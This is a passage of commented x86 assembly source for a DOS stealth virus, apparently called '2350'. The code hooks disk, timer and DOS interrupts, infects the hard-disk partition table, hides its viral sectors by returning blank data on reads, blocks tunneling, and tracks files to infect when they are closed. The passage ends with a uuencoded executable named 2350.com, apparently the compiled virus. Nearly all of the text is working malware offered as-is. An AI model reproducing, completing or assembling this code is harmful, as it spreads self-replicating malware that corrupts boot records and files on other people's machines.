        mov     ax,cs                                                           ;segment of new interrupt handler
        xchg    ax,word ptr ds:[si+2]                                           ;exchange old segment with new segment
        stosw                                                                   ;save original segment
        mov     ax,offset new_13h-offset begin                                  ;offset of new interrupt 13h handler
        mov     si,4ch                                                          ;offset of interrupt 13h in interrupt table
        mov     di,offset jfar_13h-offset begin+1                               ;area to store original interrupt 13h address
        loop    hook_part
        sti                                                                     ;enable interrupts
        mov     word ptr ds:[si+3ah],cs                                         ;destroy interrupt 21h until further notice
                                                                                ;(when system file loads, the value here will be set)
        push    ds                                                              ;save 0 on stack
        pop     es                                                              ;set ES to 0
        mov     ax,201h                                                         ;read 1 sector
        mov     bx,sp                                                           ;to offset 7c00h
        inc     cx                                                              ;cylinder 0, sector 1
        pushf                                                                   ;save flags on stack
        push    es                                                              ;save code segment on stack
        push    bx                                                              ;save offset of boot sector on stack
                                                                                ;(simulate far call)
new_13h:push    ds                                                              ;save DS on stack
        push    bx                                                              ;save BX on stack
        xor     bx,bx                                                           ;zero BX
        mov     ds,bx                                                           ;set DS to 0
        lds     bx,dword ptr ds:[bx+4]                                          ;retrieve offset of interrupt 1 handler
        push    word ptr ds:[bx]                                                ;save video segment:interrupt 1 handler offset
        mov     byte ptr ds:[bx],0cfh                                           ;save IRET in video segment:interrupt 1 handler offset
        push    0                                                               ;save 0 on stack
        popf                                                                    ;disable interrupt 1
        pop     word ptr ds:[bx]                                                ;restore video segment:interrupt 1 handler offset
        pop     bx                                                              ;restore BX from stack
        pop     ds                                                              ;restore DS from stack

;                    all attempts at a tunneling technique
;                      to locate the address of the BIOS
;                       will be terminated by this code

        cmp     ax,1badh                                                        ;check requested operation
        jnz     jfar_13h                                                        ;branch if not call sign

int13h_branch:
        mov     ax,0deedh                                                       ;return sign
        iret                                                                    ;return from interrupt
        cmp     dx,80h                                                          ;check which disk is being accessed
        jnz     jfar_13h                                                        ;branch if not hard disk
        cmp     cx,code_sect_c+1                                                ;check which sectors are being accessed

org     $-1                                                                     ;hard-coded fixup for previous operation
        ja      jfar_13h                                                        ;branch if not viral code sectors or partition table
        cmp     ah,3                                                            ;check requested operation
        jz      skip_op                                                         ;branch if write
        cmp     ah,2                                                            ;check requested operation
        jnz     jfar_13h                                                        ;branch if not read
        pusha                                                                   ;save all registers on stack
        push    ax                                                              ;save AX on stack
        pushf                                                                   ;save flags on stack
        push    cs                                                              ;save code segment on stack
        push    offset cont_13h-offset begin                                    ;save offset on stack
                                                                                ;(simulate interrupt call)
jfar_13h:
        db      0eah                                                            ;jump xxxx:xxxx
        dd      0                                                               ;original interrupt 13h here

cont_13h:
        mov     bp,sp                                                           ;point to current top of stack
        mov     word ptr ss:[bp+10h],ax                                         ;save return code on stack
        pop     ax                                                              ;restore AX from stack
        jb      quit_part                                                       ;branch if error occurred
        dec     cx                                                              ;check which sectors are being accessed
        jnz     vir_sectors                                                     ;branch if not accessing partition table
        cmp     word ptr es:[bx+offset new_part-offset newp_loader-3],offset phook_interrupts-offset begin
                                                                                ;check partition table
        jnz     quit_part                                                       ;branch if not infected
        mov     cl,move_isize   ;directive at end of code to calculate this     ;active partition byte-count

org     $-2                                                                     ;hard-coded fixup for previous operation
        mov     si,offset old_part-offset begin                                 ;offset of area containing original partition table

;         cannot use a CS:LODSW + XCHG DI,AX because AX not be altered

        mov     di,word ptr cs:[si-2]                                           ;retrieve offset of partition information
        add     di,bx                                                           ;allow for the code offset
        db      2eh                                                             ;CS:
                                                                                ;(to avoid having to save and set DS)
        repz                                                                    ;repeat until CX = 0...
        db      move_ptype      ;directive at end of code to calculate this     ;restore original partition information
        mov     cl,move_psize   ;directive at end of code to calculate this     ;new partition table loader byte-count

org     $-2                                                                     ;hard-coded fixup for previous operation
        mov     di,bx                                                           ;move offset of partition table into DI
        db      2eh                                                             ;CS:
                                                                                ;(to avoid having to save and set DS)
        repz                                                                    ;repeat until CX = 0...
        db      move_ptype      ;directive at end of code to calculate this     ;restore original partition table code
        dec     al                                                              ;reduce number of sectors by 1
        jz      quit_part                                                       ;branch if only 1 sector requested
        add     bx,200h                                                         ;skip partition table

vir_sectors:
        cmp     al,code_sect_c                                                  ;check number of sectors being accessed
        jb      set_loop                                                        ;branch if fewer than viral sectors
        mov     al,code_sect_c                                                  ;set sectors read to number of viral sectors

set_loop:
        cbw                                                                     ;only want the sector count
        mov     cx,200h                                                         ;number of bytes in a sector
        mul     cx                                                              ;calculate number of bytes to clear
        xchg    ax,cx                                                           ;set store byte to 0
        mov     di,bx                                                           ;move offset of sectors to blank into DI

clear_sectors:
        stosb                                                                   ;clear viral code sectors in memory
        loop    clear_sectors                                                   ;repeat while sectors remain
                                                                                ;(pretend sectors are blank)
quit_part:
        popa                                                                    ;restore all registers from stack

skip_op:retf    2                                                               ;return from interrupt with flags set

new_8:  call    call_21h                                                        ;simulate interrupt call
                                                                                ;(contains original interrupt 8 address)
        cli                                                                     ;disable interrupts
        push    es                                                              ;save ES on stack
        push    0                                                               ;save 0 on stack
        pop     es                                                              ;set ES to 0
        push    di                                                              ;save DI on stack
        mov     di,20h                                                          ;offset of interrupt 8 in interrupt table
        cmp     word ptr es:[di+66h],1000h                                      ;check owner of interrupt 21h
        jnb     exit_8                                                          ;branch if system file has not loaded yet
        push    si                                                              ;save SI on stack
        mov     si,offset jfar_21h-offset begin+1                               ;offset of original interrupt 8 address
        db      2eh                                                             ;CS:
                                                                                ;(to avoid having to set DS)
        movsw                                                                   ;restore original offset
        db      2eh                                                             ;CS:
                                                                                ;(to avoid having to set DS)
        movsw                                                                   ;restore original code segment
        push    ds                                                              ;save DS on stack
        push    es                                                              ;save 0 on stack
        pop     ds                                                              ;set DS to 0
        mov     si,84h                                                          ;code segment pointer to MSDOS.SYS (or equivalent)
        call    hook_int                                                        ;hook interrupt
        pop     ds                                                              ;restore DS from stack
        pop     si                                                              ;restore SI from stack

exit_8: pop     di                                                              ;restore DI from stack
        pop     es                                                              ;restore ES from stack
        sti                                                                     ;enable interrupts
        iret                                                                    ;return from interrupt

code_end:


;                                     DATA
;          used by partition infection, not present in infected files
;                              size = 48/49 bytes

ife     (offset code_end-offset begin+1)/2*2-(offset code_end-offset begin)     ;check code-size parity
else
        db      0                                                               ;word-align data area if odd
endif

p_offset        dw      0                                                       ;offset of active partition

old_part        dw      10h dup (0)                                             ;area to contain old active partition

old_loader      db      offset new_part-offset newp_loader dup (0)              ;area to contain old partition table loader

;                                     DATA
;              used while resident, not present in infected files
;                               size = 47 bytes

header_buffer   db      18h dup (0)                                             ;area to contain original file header during infection

scratch_area    db      0ah dup (0)                                             ;scratch area for infection and disinfection

old21h_code     db      5 dup (0)                                               ;area to contain original 5 bytes of interrupt handler

toggle_byte     db      0                                                       ;toggle switch

file_handle     db      0                                                       ;area to contain handle number of file to infect on closed

process_no      dw      0                                                       ;area to contain number of currently executing process

process_off     dw      0                                                       ;area to contain offset of first process

process_seg     dw      0                                                       ;area to contain segment of first process

total_end:

;assembler directive below:
init_part       equ offset new_part-offset newp_loader                          ;length of initial code
even_part       equ init_part/2*2                                               ;length of 'even'ed code

        ife     init_part-even_part                                             ;if code length is even then
                move_isize=(offset phook_interrupts-offset new_part)/2          ;use half of the length of code
                move_psize=init_part/2                                          ;use half of the length of code
                move_ptype=0a5h                                                 ;and MOVSW
        else                                                                    ;otherwise
                move_isize=offset phook_interrupts-offset new_part              ;use the inital length of code
                move_psize=init_part                                            ;use the inital length of code
                move_ptype=0a4h                                                 ;and MOVSB
        endif                                                                   ;end directive

end     begin
begin 775 2350.com
MZ```7H/N`[BM&\T3/>W>=44.'X'&^P>!/$U:=`F_``$&5Z2EZQJ#Q@Z,QX/'
M$*T#QY*MD:VMDZT#QX[2B^%04P8?RTAI06Y-:50@+2!R;WD@9R!B:78>C-A(
MCM@S_[W``+@&,\TA_L!T1[@"6,TAF)-3N`!8S2%0N`-8LP'-(;`!4'(=LT#-
M(7(7M$B+W<@^.P$B.V,=%`0@`QT4(4T-86YS-(9VX`UA;G,TAG7,.@#U:
M=18I;0,I;1*.11(.5KF7!"[SI09HT`#+!^E!_[12S2$.'XP&'P&)36]108']
M`*`3R8E-;1\.![X$`*6EO0L!B6S\C$S^K:U6I:7$7'2T&9P.:"\!4`93!FH`
M!V"+[/V-=A2_#@`VK:LVI3U'37<)OC`)KZ\NI2ZE80?/7E9HE0$.!S+DOPL#
M'L4TK#SKK'0#3DZX`_"6JXS8JQ\N.T84=R^PZK^6":JXE0*KC,BK:(0!'@9@
M#A^Y!0"^E@G$/@L#_/HFB@6DB$3_XO?[80,3/[#
M7HEL^(Q,^AZX`/"_'P&KL'6J#A^T$[M^",9'&2"+T\TO#A^_N0B)'8Q%`K0!
MG`[H0?_&!B$!=Q\>G5M8#@>!?`(`\'5:I:6.V!X'N`$"BLBZ@`#,-,9>_+@FKL0A15O.EL1*+\U%6\Z4>!PX?L`*^$PA?6?.E
M_LAU^+@!`T',#@>X!0,SVT',28/'$.+`:@`'OC()OPP`+J4NI0F7`([;+O8%`70%
M@40"P``>!\,.'YR[G0F#+P2+-_9'_H#_<`3_<`)T$ISHS/XN@#:;"8!X&3T`
M2W0$G<.F"[_;Q(.:)4"5F"Y#P"^U@)&1BZL.L3@^"[_
M-(OLCT828<,1#P,2#P,\@P,]$04^5P8_I`9`I`9"H`9+"01.#P-/#P-7K0=;
M@P-L>@,`"@.<#FB4`>H`````4.CR_YQ5B^SV1@5`=`;_=@*/1@J)1@2?79T*
MP'5+'@93GISH-/^.PR8['A8`=3:+VK0OB@?HOO_^P'4#@\,'G9QT`4L&'XI'
M%R0?-!YU%H!G%^#^1Q>=G'0"2TN!;QTN"8-?'P"=6P4597!A\.!T"Y!P"+\[M^"8O[
M\Z5?7ED?G`YHY00NHI0)4U+HN?Y:6W*V!AY@4[@`/>BK_I/HA/^BU_7(:D^B,_G0/45+H&0!:67(&N`%7Z)[]M#[HF?WHO_]A!Q_#
ML`//N"`2S2^X%A)3)HH=S2];)@A]!7A:)H!-`@)HH`4.'[0_N1@`NG0)Z67]
M,\%U01X'B_*_^P?SI(OZN%I-.P6&X'0".P6<=`?V!IL)0'4@B069Z%X`B448
MB54:G9QT$SU2]G,+Q@7I+0,`B44!ZS.=^<,Y30QT^+4"]_$+TG0!0#M%!'7J
M.U4"=>69BT48!2X)$U4:]_$+TG0!0(E5`HE%!)FY+@GH-0!H+@8SR8O1N`!"
M.+@"0NG7_)UU',1%&(S"L1#W\2M%"(E5%(E%%H'"K@F)10Z)51"+U[D8`+1`
MZ:[\+CH>G`EU.!X&8+Z;"2Z(?`$NB@0D(-#@+H`,0"XP!.BQ_NBD_^CW_G(/
MN`!7Z'[\_L"`R1])Z'7\Z)O^80HN"8/9`.A*_%G*`@!@'E(.'[@!0C/)F>@X_+Z,"8D$B50"2;K2]NA,
M_XE$!(E4!HOL@'X3/W0VNLW^Z#C_Z*#^4N@I_UKH5/^+3`:+5`3H(/\SR>A)
M_W('B%P0@$P/((M,`HL4Z`K_'Q]AZ>K[03M,`G4'N!@`*P1W`9&+3A`[R',"
MB\$KR%%0N?__NLW^`Q3HXO[%5@"T/UGHMOL.'XE$"`/04@$$BQ2+3`+HP_X[
M5`9R!WAI^RX!1`CV@\0&'V$NH90)R@(`8.@Q_&%T`^E3^PK`=0GH
M1_N`X>#*`@!1@,D?2>@Y^UG*`@`>:@`?H1,$'P4#`,\Q,R\P-2\Y-#T'%G4-
M@_L0=0B#^0-U`S/)S^H`````S2``````````````````````````````,]N.
MT[P`?"Z#+A,$`\T2P>`&CL"X!0*Y`@"Z@`#-$P9H1PC+```!``4`N`L!````
MO`$``)-`OYL)JTBKCMBX`PF^(`"_"P/ZAP2KC,B'1`*KN'X(ODP`O[D(XNS[
MC$PZ'@>X`0*+W$&4S/;CMO%7P3_-\8'SVH`G8\'6Q\]K1MU(+CMWL^!
M^H``=1:#^09W$8#\`W14@/P"=0=@4)P.:+T(Z@````"+[(E&$%AR.DEU)2:!
M?R%'"'4OL0B^,`DNBWS^`_LN\Z6Q$HO[+O.E_LAT%H'#``(\!7("L`68N0`"
M]^&1B_NJXOUAR@(`Z/_Y^@9J``=7OR``)H%]9@`07P?[SP``````````````````````````````````````````````
M````````````````````````````````````````````````````````````
E````````````````````````````````````````````````````
`
end
